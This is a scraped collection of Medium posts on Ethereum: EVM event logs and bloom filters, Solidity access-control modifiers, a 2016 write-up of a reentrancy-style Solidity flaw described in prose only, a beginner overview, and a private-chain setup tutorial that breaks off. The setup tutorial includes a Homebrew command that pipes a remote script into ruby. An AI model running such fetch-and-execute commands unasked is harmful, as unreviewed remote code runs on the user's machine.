[0xc0fefe 0x60]  dup2    [0x60 0xc0fefe 0x60]  mstore    [0x60]    memory: {      0x40 => 0x60      0x60 => 0xc0fefe    }// calculate data start position and size  0x20    [0x20 0x60]  add    [0x80]  mload(0x40)    [0x60 0x80]  dup1    [0x60 0x60 0x80]  swap2    [0x60 0x80 0x60]  sub    [0x20 0x60]  swap1    [0x60 0x20]log0Just before executing log0, there are two arguments on the stack: [0x60 0x20].start: 0x60 is the position in memory to load the data.size: 0x20 (or 32) specifies the number of bytes of data to load.The go-ethereum implementation for log0 looks something like this:func log0(pc *uint64, evm *EVM, contract *Contract, memory *Memory, stack *Stack) ([]byte, error) {  mStart, mSize := stack.pop(), stack.pop()  data := memory.Get(mStart.Int64(), mSize.Int64())  evm.StateDB.AddLog(&types.Log{    Address: contract.Address(),    Data:    data,    // This is a non-consensus field, but assigned here because    // core/state doesn't know the current block number.    BlockNumber: evm.BlockNumber.Uint64(),  })  evm.interpreter.intPool.put(mStart, mSize)  return nil, nil}You can see in this code that log0 pops two arguments from stack, then copies the data from memory. Then it calls StateDB.AddLog to associate the log with the contract.Logging With TopicsTopics are 32 bytes of arbitrary data. An Ethereum implementation would use these topics to index logs for efficient event logs querying and filtering.This example uses the log2 primitive. The first argument is the data (of any number of bytes), followed by 2 topics (32 bytes eacb):// log-2.solpragma solidity ^0.4.18;contract Logger {  function Logger() public {    log2(0xc0fefe, 0xaaaa1111, 0xbbbb2222);  }}The assembly is very similar. The only difference is that the two topics (0xbbbb2222, 0xaaaa1111) are pushed onto the stack at the very beginning:tag_1:  // push topics  0xbbbb2222  0xaaaa1111// copy data into memory  0xc0fefe  mload(0x40)  swap1  dup2  mstore  0x20  add  mload(0x40)  dup1  swap2  sub  swap1// create log  log2The data is still 0xc0fefe, copied to memory. Just before executing log2, the state of the EVM looks like:stack: [0x60 0x20 0xaaaa1111 0xbbbb2222]memory: {  0x60: 0xc0fefe}log2The first two arguments specifies the memory region to use as log data. The two additional stack arguments are two 32 bytes topics.All EVM Logging PrimitivesThe EVM supports 5 logging primitives:0xa0 LOG00xa1 LOG10xa2 LOG20xa3 LOG30xa4 LOG4They are all the same, except for the number of topics used. The go-ethereum implementation actually generates these instructions using the same code, varying only in size, which specifies the number of topics to pop from stack.func makeLog(size int) executionFunc {  return func(pc *uint64, evm *EVM, contract *Contract, memory *Memory, stack *Stack) ([]byte, error) {    topics := make([]common.Hash, size)    mStart, mSize := stack.pop(), stack.pop()    for i := 0; i < size; i++ {      topics[i] = common.BigToHash(stack.pop())    }    d := memory.Get(mStart.Int64(), mSize.Int64())    evm.StateDB.AddLog(&types.Log{      Address: contract.Address(),      Topics:  topics,      Data:    d,      // This is a non-consensus field, but assigned here because      // core/state doesn't know the current block number.      BlockNumber: evm.BlockNumber.Uint64(),    })    evm.interpreter.intPool.put(mStart, mSize)    return nil, nil  }}Feel free to poke around the code on sourcegraph:https://sourcegraph.com/github.com/ethereum/go-ethereum@83d16574444d0b389755c9003e74a90d2ab7ca2e/-/blob/core/vm/instructions.go#L744Logging Testnet DemoLet\u2019s try to generate some logs with a deployed contract. The contract logs 5 times, using different data and topics:pragma solidity ^0.4.18;contract Logger {  function Logger() public {    log0(0x0);    log1(0x1, 0xa);    log2(0x2, 0xa, 0xb);    log3(0x3, 0xa, 0xb, 0xc);    log4(0x4, 0xa, 0xb, 0xc, 0xd);  }}This contract is deployed on the Rinkeby test network. The transaction that created this contract is:https://rinkeby.etherscan.io/tx/0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1Click on the \u201cEvent Logs\u201d tab, you should see the raw data for the 5 log items:The topics are all 32 bytes. The number we logged as data is encoded as a 32 bytes numbers.Querying For The LogsLet\u2019s use Ethereum\u2019s JSON RPC to query for these logs. An Ethereum API node would create indices to make it efficient to find logs by matching topics, or to find logs that are generated by a contract address.We\u2019ll use the hosted RPC nodes provided by the kind folks at infura.io. You can get the API key by registering a free account.Once you get the key, set the shell variable INFURA_KEY for the following curl examples to work:INFURA_KEY=my_infura_key_blah_blah_blahFor a simple example, let\u2019s call eth_getLogs to fetch all the logs associated with the contract:curl \"https://rinkeby.infura.io/$INFURA_KEY\" \\  -X POST \\  -H \"Content-Type: application/json\" \\  --data '{  \"jsonrpc\": \"2.0\",  \"id\": 1,  \"method\": \"eth_getLogs\",  \"params\": [{    \"fromBlock\": \"0x0\",    \"address\": \"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0\"  }]}'fromBlock: from which block to start looking for logs. By default it starts looking at the tip of the blockchain. We want all logs, so we start from the first block.address: logs are indexed by contract addresses, so this is actually quite efficient.The output is the underlying data that etherscan displays for the \u201cEvent Logs\u201d tab. See the full output: evmlog.json.A log item returned by the JSON API looks like this:{  \"address\": \"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0\",  \"topics\": [    \"0x000000000000000000000000000000000000000000000000000000000000000a\"  ],  \"data\": \"0x0000000000000000000000000000000000000000000000000000000000000001\",  \"blockNumber\": \"0x179097\",  \"transactionHash\": \"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1\",  \"transactionIndex\": \"0x1\",  \"blockHash\": \"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57\",  \"logIndex\": \"0x2\",  \"removed\": false}Next, we can query for logs that matches the topic \u201c0xc\u201d:curl \"https://rinkeby.infura.io/$INFURA_KEY\" \\  -X POST \\  -H \"Content-Type: application/json\" \\  --data '{  \"jsonrpc\": \"2.0\",  \"id\": 1,  \"method\": \"eth_getLogs\",  \"params\": [{    \"fromBlock\": \"0x179097\",    \"toBlock\": \"0x179097\",    \"address\": \"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0\",    \"topics\": [null, null, \"0x000000000000000000000000000000000000000000000000000000000000000c\"]  }]}'topics: an array of topics to match. null matches anything. See details.There should be two matching logs:{  \"address\": \"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0\",  \"topics\": [    \"0x000000000000000000000000000000000000000000000000000000000000000a\",    \"0x000000000000000000000000000000000000000000000000000000000000000b\",    \"0x000000000000000000000000000000000000000000000000000000000000000c\"  ],  \"data\": \"0x0000000000000000000000000000000000000000000000000000000000000003\",  \"blockNumber\": \"0x179097\",  \"transactionHash\": \"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1\",  \"transactionIndex\": \"0x1\",  \"blockHash\": \"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57\",  \"logIndex\": \"0x4\",  \"removed\": false},{  \"address\": \"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0\",  \"topics\": [    \"0x000000000000000000000000000000000000000000000000000000000000000a\",    \"0x000000000000000000000000000000000000000000000000000000000000000b\",    \"0x000000000000000000000000000000000000000000000000000000000000000c\",    \"0x000000000000000000000000000000000000000000000000000000000000000d\"  ],  \"data\": \"0x0000000000000000000000000000000000000000000000000000000000000004\",  \"blockNumber\": \"0x179097\",  \"transactionHash\": \"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1\",  \"transactionIndex\": \"0x1\",  \"blockHash\": \"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57\",  \"logIndex\": \"0x5\",  \"removed\": false}Logging Gas CostsThe gas costs for the logging primitives depends on how many topics you have and how much data you log:// Per byte in a LOG operation's dataLogDataGas       uint64 = 8// Per LOG topicLogTopicGas uint64 = 375   // Per LOG operation.LogGas           uint64 = 375These constants are defined in protocol_params.Don\u2019t forget the memory used, which is 3 gas per byte:MemoryGas        uint64 = 3    Wait what? It costs only 8 gas per byte of log data? That\u2019s 256 gas for 32 bytes, and 96 gas for the memory use. So 322 gas versus 20000 gas for storing the same amount of data in storage, only 1.7% of the cost!But wait, if you are passing in the log data as calldata to a transaction, you\u2019ll need to pay for the transaction data too. The gas costs for calldata are:TxDataZeroGas      uint64 = 4     // zero tx data abyteTxDataNonZeroGas   uint64 = 68    // non-zero tx data byteAssuming all 32 bytes are non-zero, this is still a lot cheaper than storage:// cost of 32 bytes of log data32 * 68 = 2176 // tx data cost32 * 8 = 256 // log data cost32 * 3 = 96 // memory usage cost375 // log call cost----total (2176 + 256 + 96 + 375)~14% of sstore for 32 bytesMost of the gas cost is actually spent on transaction data, not for the log operation itself.The reason that a log operation is cheap is because the log data isn\u2019t really stored in the blockchain. Logs, in principle, can be recalculated on the fly as necessary. Miners, in particular, can simply throw away the log data, because future calculations can\u2019t access past logs anyway.The network as a whole does not bear the cost of logs. Only the API service nodes need to actually process, store, and index the logs.So the cost structure of logging is just the minimal cost to prevent log spamming.Solidity EventsHaving seen how the logging primitives work, Solidity events are straightforward.Let\u2019s look at a Log event type that takes 3 uint256 parameters (non-indexed):pragma solidity ^0.4.18;contract Logger {  event Log(uint256 a, uint256 b, uint256 c);  function log(uint256 a, uint256 b, uint256 c) public {    Log(a, b, c);  }}Instead of looking at the assembly code, let\u2019s just look at the raw log that\u2019s generated.Here\u2019s a transaction that invokes log(1, 2, 3):https://rinkeby.etherscan.io/tx/0x9d3d394867330ae75d7153def724d062b474b0feb1f824fe1ff79e772393d395The log data:The data is the event parameters, ABI encoded:000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003There is one topic, a mysterious 32 bytes hash:0x00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f0This is the SHA3 hash of the Event type signature:# Install pyethereum # https://github.com/ethereum/pyethereum/#installation> from ethereum.utils import sha3> sha3(\"Log(uint256,uint256,uint256)\").hex()'00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f0'This is quite similar to how ABI-encoding for a method call works.Because a Solidity event uses one topic for the event signature, there are only 3 topics left for indexed parameters.Solidity Event With Indexed ArgumentsLet\u2019s look at an event that has an indexed uint256 parameter:pragma solidity ^0.4.18;contract Logger {  event Log(uint256 a, uint256 indexed b, uint256 c);  function log(uint256 a, uint256 b, uint256 c) public {    Log(a, b, c);  }}The generated event logs:There are now two topic:0x00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f00x0000000000000000000000000000000000000000000000000000000000000002The first topic is the event type signature, hashed.The second topic is the indexed parameter, as is.The data is the ABI encoded event parameters, excluding the indexed parameters:00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003String/Bytes Event ParameterLet\u2019s now change the event parameters to be strings:pragma solidity ^0.4.18;contract Logger {  event Log(string a, string indexed b, string c);  function log(string a, string b, string c) public {    Log(a, b, c);  }}Generate the log with log(\"a\", \"b\", \"c\"). The transaction is:https://rinkeby.etherscan.io/tx/0x21221c2924bbf1860db9e098ab98b3fd7a5de24dd68bab1ea9ce19ae9c303b56There are two topics:0xb857d3ea78d03217f929ae616bf22aea6a354b78e5027773679b7b4a6f66e86b0xb5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510The first topic is again the method signature.The second topic is the sha256 digest of the string parameter.Let\u2019s verify that the hash of \u201cb\u201d is the same as the second topic:>>> sha3(\"b\").hex()'b5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510'The log data is the two non-indexed strings \u201ca\u201d and \u201cc\u201d, ABI-encoded:000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001610000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016300000000000000000000000000000000000000000000000000000000000000Unfortunately, the original string for the indexed string parameter is not stored, so there is no way for the DApp client to recover it.If you REALLY need the original string, just log it twice, both indexed and non-indexed:event Log(string a, string indexed indexedB, string b);Log(\"a\", \"b\", \"b\");Query For Logs EfficientlyHow can we find all the logs whose first topic matches \u201c0x000\u2026001\u201d? Naively, we can start from the genesis block and re-execute every single transaction, and see if the logs generated match our filtering condition. This is no good.As it turns out, the block header includes enough information for us to quickly skip over blocks that don\u2019t have the logs we want.The block header includes information like the parent hash, the uncles hash coinbase, and a bloom filter for all the logs generated by the transactions included in this block. It looks like:type Header struct { ParentHash  common.Hash    `json:\"parentHash\"       gencodec:\"required\"` UncleHash   common.Hash    `json:\"sha3Uncles\"       gencodec:\"required\"` Coinbase    common.Address `json:\"miner\"            gencodec:\"required\"`// ...// The Bloom filter composed from indexable information (logger address and log topics) contained in each log entry from the receipt of each transaction in the transactions list Bloom       Bloom          `json:\"logsBloom\"        gencodec:\"required\"`}https://sourcegraph.com/github.com/ethereum/go-ethereum@479aa61f11724560c63a7b56084259552892819d/-/blob/core/types/block.go#L70:1The bloom filter is a fixed 256 bytes data structure. It behaves like set, and you can ask it whether a topic exists in it or not.So we can optimize the log query process like this:for block in chain:  # check bloom filter to filter out a block quickly  if not block.Bloom.exist(topic):    next  # block might have the log we want, re-execute  for tx in block.transactions:    for log in tx.recalculateLogs():      if log.topic[0].matches(topic)        yield logAside from topics, the address of contract that emits the logs are also added to the bloom filter.BloomBitsTrieThe Ethereum mainnet has about 5,000,000 blocks in Jan 2018, and iterating through all blocks can still be quite expensive because you\u2019d need to load the block headers from disk.The average block header being about 500 bytes, you\u2019d be loading 2.5GB of data in total.Felf\u00f6ldi Zsolt implemented the BloomBitsTrie in PR #14970 to make logs filtering even faster. The idea is that instead of looking at each block\u2019s bloom filter separately, it\u2019s possible to design a data structure that looks at 32768 blocks all at the same time.To understand what follows, the least you need to know about bloom filter is that storing a piece of data \u201chashes\u201d it to 3 random (but deterministic) bits in a bloom filter and set them to 1. To check for existence we check whether those 3 bits are set to 1.The bloom filter used in Ethereum is 2048 bits.Suppose the topic \u201c0xa\u201d sets the 16th, 632th, and 777th bits of a bloom filter to 1. The BloomBits Trie is a 2048 x 32768 bitmap. Indexing into the BloomBits structure gives us three 32768 bit vectors:BloomBits[15] => 32768 bit vector (4096 byte)BloomBits[631] => 32768 bit vector (4096 byte)BloomBits[776] => 32768 bit vector (4096 byte)These bit vectors tell us which blocks has the 16th, 632th, and 777th bits of their bloom filters set to 1.Let\u2019s look at the first 8 bits of these vectors, which might look like10110001...00101101...10101001...The 1st block has the 16th and 776th bits set to 1, but not the 631th bit.The 3rd block has all three bits set.The 8th block has all three bits set.Then we can quickly find the blocks that match all three bits by applying binary-AND to these vectors:00100001...The final bit vector tells us exactly which blocks among 32768 match our filtering condition.To match multiple topics, we just do the same indexing for each topic, and then binary-AND the final bit vectors together.See BloomBits Trie for more details on how this works.ConclusionIn summary, an EVM log may have up to 4 topics, and an arbitrary number of bytes as data. Solidity event\u2019s non-indexed arguments are ABI-encoded as data, and indexed arguments used as log topics.The gas cost of storing log data is much cheaper than normal storage, so you might consider it as an alternative for your DApp as long as your contract doesn\u2019t need access to the data.Two alternative design choices for the logging-facilities may be:Allowing more number of topics, though more topics would decrease the effectiveness of the bloom filters used to index logs by topics.Allowing topics to be have an arbitrary number of bytes. Why not?If you like EVM and furry animals, you should follow me on Twitter @hayeah.In this article series about the EVM I write about:Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.What is going on when a new contract is created.EVM event logs.If you\u2019d like to learn more about the EVM, subscribe to my weekly tutorial:", "responses": 6, "tags": ["Ethereum", "Blockchain", "Cryptocurrency", "Qtum", "Blockchain 101"]}, {"title": "Writing robust smart contracts in Solidity", "post_link": "https://medium.com/colony/writing-more-robust-smart-contracts-99ad0a11e948?source=search_post", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2016-08-10", "last_modified_date": "2018-06-03", "readtime": "3.48", "claps": 262, "voters": 75, "content": "Writing robust smart contracts in SolidityElena DimitrovaFollowAug 10, 2016 \u00b7 4 min readBefore contract function code executes, it\u2019s a good idea to validate who triggered it and what inputs are given.Here we build on the Solidity documentation and our own practice to demonstrate a few methods for validating caller and data of inter-contract communication, in both contract-to-contract and user-to-contract calls.Restricting access is a common pattern for contracts. Note that you can never restrict any human or computer from reading the content of your transactions or your contract\u2019s state. [..] You can restrict read access to your contract\u2019s state by other contracts.Furthermore, you can restrict who can make modifications to your contract\u2019s state or call your contract\u2019s functions. The use of function modifiers makes these restrictions highly readable.Building on the Solidity common patterns above, we make extensive use of function modifiers to ensure the validity of function calls in terms of who the caller is as well as what data is.Validating callerFor call authorisation we can start with a simple scenario where the creator of the contract is the only one we\u2019d like to allow to make certain restricted \u2018owner-only\u2019 calls, e.g. changing the owner, writing to storage, or killing the contract.The Ownable.sol contract below defines the basis of implementing such contract \u2018ownership\u2019 and owner-only function modifier.Any contract which inherits Ownable will have owner set to the caller at the time of its creation, and any of its functions implementing onlyOwner modifier will not accept calls from another account. Note that the creator can be a user or another contract.To put that in context, we use the sample contract code from our previous post on implementing upgradable contracts \u2014 specifically the main two contracts: \u2018Parent\u2019 and \u2018Organisation\u2019. To recap those, Parent contract is used to create, store, retrieve and upgrade Organisation instances. Organisation interacts with an instance of EternalStorage via ProposalsLibrary and also with an ITokenLedger implementation instance.We\u2019ll demonstrate how to secure Organisation contract\u2019s storage to allow owner-only write permissions.Securely writing to StorageEternalStorage contract is used to read and write values of different types to storage. Every Organisation contract has an instance of EternalStorage to which only it should be able to write. In this case the owner of EternalStorage should be a contract (Organisation) rather than a user. We do not want users to be interacting directly with storage as all the business rules for data are abstracted away from it.For the implementation we simply inherit Ownable and decorate all storage write functions with the onlyOwner modifier, e.g. setUIntValue, setStringValue etc.We need to ensure the owner of EternalStorage instance is the Organisation contract. The easiest way to ensure that, is to let it create it. See constructor below.Here msg.sender in EternalStorage is the Organisation contract which then becomes the only address allowed to write to storage.Note on Libraries: We use a library contract (ProposalsLibrary) to attach a set of functions to EternalStorage, so effectively message calls flow through the following chain: Organisation -> ProposalsLibrary -> EternalStorage.However, since libraries in Solidity pass on the msg.value and msg.sender values, calls to EternalStorage have msg.sender as the Organisation contract address and not ProposalsLibrary address.Securely writing to Storage \u2014 extended exampleLet\u2019s extend the simplified example above to cover our sample scenario of using a Parent contract to create and manage Organisations. We would also like to remove the Organisation contract dependency on EternalStorage just to make our contract lighter. For this we have delegated the role of creating EternalStorage and Organisation to Parent contract, which are both created via the Parent.createOrganisation(bytes32) function. When Parent calls new EternalStorage() it becomes the owner of it as well, so it needs to call Ownable.changeOwner(address) to adjust ownership to the newly created Organisation.This is an example of where EternalStorage ownership change is required due to the more complex initiation process of our contracts.Support for multiple admin accountsSince msg.sender only allows for a single owner per contract, to implement support for multiple admins we can make use of storage to manage a collection of user admin account addresses.Below is a helper library which implements the basic functionality of adding and removing admin accounts for a given contract (address).The isUserAdmin function can then be used in a modifier, just like onlyOwner in our previous example. For instance if we wanted to allow multiple admins in Organisation we can implement this as follows.Validating dataIn addition to authorising the call sender, modifiers can be also used to validate the data provided with the call. A sample library of useful modifiers is below, implementing checks for various types, e.g. empty address or zero value integers.Putting it all togetherWith the armour of authorisation and validation modifiers you can decorate your functions as necessary to ensure that before you execute a function, you have subjected the caller and call data to the utmost scrutiny. Example of such use is in our Organisation.addProposal(bytes32) function which should only allow Organisation admins to create proposals. Additionally we ensure no ether is sent with the request and that we get a non empty key for the proposal being created.", "responses": 1, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Security"]}, {"title": "A security issue with Ethereum\u2019s Solidity language, not just the DAO", "post_link": "https://medium.com/@muneeb/solar-storm-a-serious-security-exploit-with-ethereum-not-just-the-dao-a03d797d98fa?source=search_post", "author_name": "Muneeb Ali", "author_link": "https://medium.com/@muneeb", "publish_date": "2016-06-20", "last_modified_date": "2018-06-07", "readtime": "2.95", "claps": 134, "voters": 78, "content": "A security issue with Ethereum\u2019s Solidity language, not just the DAOMuneeb AliFollowJun 20, 2016 \u00b7 3 min readUPDATE: This post is from June 2016 and listed a security issue with Solidity. Since then there have been other issues but also a lot of growth of the Ethereum ecosystem. It\u2019s great to see innovation in decentralized computing.Another issue in Solidity, a JavaScript-like language that Ethereum uses for smart contracts, has been highlighted that can impact any Ethereum contract, not just the DAO.This issue is specifically a problem with the design of the Solidity language. There is a rich body of research on formal languages for contracts (see this survey or this post by Nick Szabo). Ethereum, however, decided to use a JavaScript-like language instead.The issue impacts some, and not all, contracts on Ethereum. And developers of future contracts can avoid writing exploitable contracts by closely following guidelines and best practices.This does NOT mean that Ethereum is permanently broken. The Solidity compiler can warn programmers of this particular issue.What\u2019s the issue?Ethereum contracts call out to other contracts routinely. This practice is encouraged by the community with a vision of smart contracts everywhere talking to each other.Turns out that when an Ethereum contract talks to another contract, it can lose its own program control and state. This vulnerability was discovered by Joey Krug and Martin K\u00f6ppelmann, and publicized by Philip Daian, a PhD student at Cornell studying with Emin Gun Sirer.It\u2019s important to differentiate this issue from reentrancy, which is a known issue and was used to attack the DAO. This issue is a slightly different form of reentrancy and the subtle details are important. Let\u2019s call this issue solarstorm (for the lack of a better name). Daian didn\u2019t explicitly name it, but likes the solar-storm name.Solarstorm vs. Reentrancy:This issue might look similar to reentrancy, but it\u2019s broader than reentrancy and developers need to think about shared state explicitly.The reentrancy issue can happen when:1. Contract A, function A calls contract B.2. Contract B calls contract A, function A.The key insight by Daian is that even a single call out by any contract is enough. The solar-storm issue can happen when:1. Contract A calls out to any arbitrary external contract.2. Contract A has an external function that modifies state (most do).So an example of solar-storm exploit can be:1. Contract A, function A calls contract B.2. Contract A has another function C that shares state with function A.3. Contract B calls contract A, function C.This means that in Ethereum contracts you either (a) cannot use external calls in your contract or (b) you cannot have externally callable functions that share state with functions that make external calls.Getting rid of (a) is hard in practice, so this means that you basically need to be very careful about (b). If you must have external calls, then you can only use them at the end of your own logic and once the external call is executed you cannot assume anything about the state of your contract.This can be viewed as a variant of reentrancy, but it\u2019s a broader issue than reentrancy and easier to miss.Even if the other issue (unchecked-send and reentrancy) were not there, solarstorm alone is sufficient to steal $150M from the DAO.What does this mean?To summarize:This can impact any contract on Ethereum, not just the DAO. This is an issue with Ethereum\u2019s JavaScript-like programming language (Solidity).It\u2019s possible to have issues in already published Ethereum contracts. Developers should check if their contracts are vulnerable and take appropriate actions (move funds, publish new contracts).Developers need to be extremely careful with making external calls in future contracts. Avoid external calls until this issue is addressed.Ethereum is NOT permanently broken. Solidity compiler can warn programmers of this particular exploit.Next steps:A full-review of all published smart contracts is needed. We also need a static analyzer to catch the vulnerability and the Solidity compiler should detect this issue. This vulnerability is not yet widely publicized and the Solidity documentation should warn people about it.Comments? Tweet them @muneeb. Thanks Philip Daian for helpful discussions and Elizabeth Stark for reading drafts of this post. See my earlier post on Ethereum for challenges with using a turing-complete language.", "responses": 9, "tags": ["Ethereum", "Blockchain", "Security"]}, {"title": "Solidity for Beginners", "post_link": "https://medium.com/swlh/solidity-for-beginners-9b8cb5cb4620?source=search_post", "author_name": "The Cryptocurrency Consultant", "author_link": "https://medium.com/@thecryptoconsultant", "publish_date": "2019-05-22", "last_modified_date": "2019-06-12", "readtime": "3.73", "claps": 2454, "voters": 70, "content": "Solidity for BeginnersIntroduction to the Smart Contracts Programming LanguageThe Cryptocurrency ConsultantFollowMay 22 \u00b7 4 min readSolidity is a contact-oriented programming language for writing intelligent contracts. It is used to implement Smart Contracts on various blockchain platforms and developed by some former Ethereum employees \u2014 originally only for the blockchain platform Ethereum. Later, the programming language was also used on other blockchains. (I get commissions for purchases made through links in this post.)How To Be A Blockchain DeveloperBlockchain developers are in high demand, but how do you get this qualification?medium.comDevelopment of the Ethereum Blockchain programming languageSolidity was originally conceived in August 2014 by Gavin Wood. The language was later developed by the Solidity team of the Ethereum project, led by Christian Reitwiessner. It is one of four languages (the others are Serpent, LLL, Viper (experimental) and Mutan (obsolete), designed specifically for the Ethereum Virtual Machine (EVM) and is currently used as the main language on Ethereum and other private blockchains.Users can use Solidity in their browser without having to download anything. This application only supports compilation \u2014 if users want to execute the code or include it in the blockchain, they must use a client like AlethZero. With Solidity, developers are able to write applications that implement self-reinforcing business logic anchored in intelligent contracts, leaving an irrefutable and binding record of transactions.Solidity VerificationIn fact, it is a deliberately slimmed down programming language with a syntax very similar to that of ECMAScript (Javascript). Programmers are working with a stack-and-memory model with a 32-byte command word size that gives EVM access to the \u201cstack\u201d program, which is structured like a register space and in which memory addresses can be stored to create the program counter loop/jump (for sequential program control), an expandable temporary \u201cmemory\u201d, and a more permanent \u201cmemory\u201d that is actually written.This demand for determinism is the reason why users will not see the \u201crandom()\u201d function in the solidarity language. When a block is \u201cdisintegrated\u201d, the smart contract implementations and function calls within that block (i.e. those executed within the last block duration) are executed on the node that disintegrates the block, and the new state changes to all storage locations or transactions within that smart contract that actually take place on that Miner node.Then the new block is transferred to all other nodes and each node tries to verify the block independently, which also means that it makes the same state changes to its local copy of the blockchain. The process will fail if the smart contract is non-deterministic. If the other nodes cannot reach a consensus on the state of the blockchain after the new block and its contracts have been executed, the network could literally come to a standstill. For this reason, Ethereum\u2019s Smart-Contracts (and Smart-Contracts in general in any blockchain system) must be deterministic: so that the network of nodes can always validate and maintain the consensus about the new blocks arriving in the block in order to continue to run.Solidity Smart Contracts @http://solidity.readthedocs.ioNo external accessAnother limitation that users find in EVM Smart-Contracts is the inability to access data outside of \u201cmemory\u201d and \u201cmemory\u201d (it is not intended that the Smart-Contract can read or erase the hard disks of the nodes on which it runs), and the inability to query external resources like a JQuery.When users call a Smart-Contract that performs state changing work or calculation (any action except simply reading from memory), the Smart-Contract will incur power costs for its work and these are related to the amount of computational work required to perform the function. It is a kind of \u201cmicropayment for microcomputing\u201d system where you can expect to pay for a certain amount of electricity for a certain amount of calculations.Smart Contracts at SoliditySmart-Contracts have their own addresses from which they can receive and send Ethereum. Intelligent contracts can trace the \u201ccaller\u201d of the function so that it can be determined whether one of its functions is called by a privileged \u201cowner\u201d or \u201cadmin\u201d account and can act accordingly administratively.Users can read data from the Ethereum blockchain and access information about transactions in older blocks.But are smart contracts \u201clocked\u201d into their own small deterministic world, only able to know the data stored in the Ethereum blockchain itself?Not at all! This is where the \u201coracles\u201d come into play. Users can turn a call into an oracle that trustworthily tells something about the outside world and reacts to this data within the framework of the intelligent contract. The crux of the matter is that, although the real events themselves are not deterministic, the oracle can trust that it will always respond deterministically to each node\u2019s requests about what is happening so that all nodes can still reach a consensus.", "responses": 0, "tags": ["Ethereum", "Programming", "Solidity", "Blockchain", "Smart Contracts"]}, {"title": "How to set up a private Ethereum blockchain and deploy a Solidity Smart Contract on the blockchain \u2014 in less than 20 mins!", "post_link": "https://medium.com/blockchainbistro/set-up-a-private-ethereum-blockchain-and-deploy-your-first-solidity-smart-contract-on-the-caa8334c343d?source=search_post", "author_name": "Prashant Ram", "author_link": "https://medium.com/@prashantramnyc", "publish_date": "2018-08-01", "last_modified_date": "2019-08-28", "readtime": "7.32", "claps": 485, "voters": 70, "content": "How to set up a private Ethereum blockchain and deploy a Solidity Smart Contract on the blockchain \u2014 in less than 20 mins!From Zero to One: A step-by-step tutorial on setting up a private Ethereum blockchain and deploying Solidity smart contractsPrashant RamFollowAug 1, 2018 \u00b7 8 min readIn the following tutorial we will,Install the requisite software packages to run a private Ethereum blockchain on a Mac.Run a private blockchain in a test environment, and \u201cmine\u201d dummy \u201cether\u201d and \u201cgas\u201d ( to run smart contracts).Create a \u201cHello World\u201d smart contract in Solidity, compile it using Truffle and deploy it to the private Ethereum network.Run the \u201chello world\u201d smart contract within the truffle console.And we will do all of this within 15 mins or less, so let\u2019s begin!Step 0: Pre-installationBefore you begin installation make sure you have latest versions of Homebrew and Node/npm.To install Homebrew:go to https://brew.sh/Cut-paste the latest homebrew cURL within your terminal/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"Once homebrew installation is complete, verify you have the latest version.$ brew --versionTo install Node and npm:Go to https://nodejs.org/en/ and install Node and NPMOnce node and npm are install verify the version number.$ npm -vStep 1: Installing Ethereum, Solidify and TruffleNext we will install the following,Geth (go-etheruem): This is command line client interface that allows one to connect to the Ethereum blockchain. (The other clients that can be used to connect to Ethereum are Eth (C++ implementation), and PyEthApp(Python implementation). All the clients have almost identical functionality and Geth is the most suited if you are familiar with javascript/web development language).Truffle: This is the Solidity Framework and IDE, which is used to compile, deploy and test your Smart contract.Solidity compiler: The Truffle framework will use the Solidity compiler.Let\u2019s continue,Installing Geth$ brew tap ethereum/ethereum$ brew install ethereum2. Installing Truffle$ sudo npm install -g truffle3. Installing Solidity$ sudo npm install -g solcStep 2: Setup and configurationThis step will include the following,Configuring the genesis block, andInitiating the chain data in the blockchainCreate a new project directory, and create the following genesis.json$ mkdir project1$ cd project1$ touch genesis.json1.Configuring the Genesis BlockYou can use Visual Studio code or any other editor to cut-paste the following code in the genesis.json file.{\"config\": {\"chainId\": 143,\"homesteadBlock\": 0,\"eip155Block\": 0,\"eip158Block\": 0},\"alloc\": {},\"difficulty\" : \"0x20000\",\"gasLimit\"   : \"0x8880000\"}Explanation of the config file:chainId: A unique identifier of the new private blockchainhomesteadBlock: Homestead is the first production release of Ethereum and since the developers are already using this version the value of this parameter can be left as \u20180\u2019.eip155Block/eip158Block: EIP stands for \u201cEthereum Improvement Proposals\u201d, these were implement to release Homestead. In a private blockchain development hard forks aren\u2019t needed, hence the parameter value should be left as \u20180\u2019.difficulty: controls the complexity of the mining puzzle and a lower value enables quicker mining.gasLimit: Establishes an upper limit for executing smart contracts.alloc: allows allocation of Ethers to a specific address.2. Creating the folder where your blockchain will reside$ mkdir blkchain$ geth --datadir blkchain init genesis.jsonThe second line initializes the blockchain and the blockchain data will be stored in the \u201cblkchain\u201d folder. This folder will grow in size as data is added to the blockchain, and if this folder is deleted the block chain will need to be reinitialized.Step 3: Initiate and Run the Private Ethereum BlockchainBring up the Private Ethereum blockchain!To get the private Ethereum 